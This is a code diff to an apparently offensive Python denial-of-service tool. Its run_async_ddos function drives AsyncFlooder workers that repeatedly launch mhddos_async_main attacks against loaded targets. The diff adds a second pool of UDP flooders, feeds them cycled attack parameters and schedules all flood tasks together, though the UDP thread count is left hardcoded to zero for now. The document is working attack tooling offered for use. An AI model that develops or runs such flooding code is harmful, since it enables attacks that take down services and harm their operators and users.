@@ -61,6 +61,7 @@ async def run_async_ddos(
     debug,
     table,
     total_threads,
+    udp_threads,
     switch_after,
     dns_executor,
 ):
@@ -99,6 +100,7 @@ async def run_async_ddos(
         await asyncio.sleep(5)
 
     flooders = [AsyncFlooder(switch_after) for _ in range(total_threads)]
+    udp_flooders = [AsyncFlooder(switch_after) for _ in range(udp_threads)]
 
     # XXX: might throw an exception
     async def load_targets():
@@ -126,9 +128,16 @@ async def run_async_ddos(
                     register_params(Params(target, method), kwargs_list)
             else:
                 raise ValueError(f"Unsupported scheme given: {target.url.scheme}")
-        runnables_iter = cycle(mhddos_async_main(**kwargs) for kwargs in kwargs_list)
-        for flooder in flooders:
-            flooder.update_targets(runnables_iter)
+        if kwargs_list:
+            runnables_iter = cycle(mhddos_async_main(**kwargs) for kwargs in kwargs_list)
+            for flooder in flooders:
+                flooder.update_targets(runnables_iter)
+        # XXX: there should be a better way to write this code
+        if udp_kwargs_list:
+            udp_runnables_iter = cycle(mhddos_async_main(**kwargs) for kwargs in udp_kwargs_list)
+            for flooder in udp_flooders:
+                flooder.update_targets(udp_runnables_iter)
+
 
     initial_targets = await load_targets()
     if not initial_targets:
@@ -136,7 +145,7 @@ async def run_async_ddos(
         exit()
     install_targets(initial_targets)
 
-    tasks = [asyncio.ensure_future(f.loop()) for f in flooders]
+    tasks = [asyncio.ensure_future(f.loop()) for f in (flooders + udp_flooders)]
 
     async def stats_printer():
         refresh_rate = 5
@@ -250,6 +259,7 @@ async def start(args):
         args.debug,
         args.table,
         args.threads,
+        0, # XXX: get back to this functionality later args.udp_threads,
         args.switch_after,
         dns_executor,
     )
